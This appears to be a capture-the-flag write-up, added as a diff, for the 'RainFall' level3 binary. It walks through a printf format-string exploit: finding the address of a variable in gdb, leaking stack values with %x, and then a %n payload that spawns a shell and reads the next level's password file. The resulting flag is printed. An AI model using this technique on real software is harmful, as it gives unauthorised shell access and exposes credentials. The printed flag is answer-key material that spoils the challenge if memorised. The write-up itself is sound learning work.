@@ -1,0 +1,45 @@
+# At the root of the repository, we can found a level3 executable
+# Once started, it waits for something on stdin
+# After few tests and review of the code we can see that level3 program uses printf to print on stdout
+# It only takes the argument of fgets (what we give in stdin), that's our exploit
+# By checking level3 binary, we can see that main function execute v() function and v function executes fgets and print result with printf (without using modifier (ex: printf(s) instead of printf("%s", toto)))
+# We can also see there is a condition that check if the value of variable 'm' is equal to 64, if it is, the condition executes bin/sh, that's what we want
+# Thanks to gdb we can found the address of m variable:
+
+gdb ~/level3
+
+info variables
+...
+0x08049884  completed.6159
+0x08049888  dtor_idx.6161
+0x0804988c  m
+
+# The address of m is '0804988c'
+# Thanks to that, we can use the exploit of printf to modify the value of m
+# Let's try some things with printf format exploit:
+
+./level3
+AAAA %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141
+
+# We can see thanks to %x identifier of printf the stack address values next to our first argument
+# We can also see that the 4th address is the value of our first argument
+# Let's put the address of 'm' in our first argument to modify the stack value
+
+(python -c 'print("\x8c\x98\x04\x08" + "%x" * 4)'; cat -) | ./level3
+�200b7fd1ac0b7ff37d0804988c
+
+# The 4th address is well-replaced
+# Now this part is done we can overwrite the value of m by writing on the address in the stack
+# To do that we'll use the %n modifier of printf that writes the number of bytes written before
+# The width of the address of m is 4 bytes, the condition waits a value of 64 (for the variable), let's fill the buffer by 60 bytes 
+
+level3@RainFall:~$ (python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")'; cat -) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+# We have our flag: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
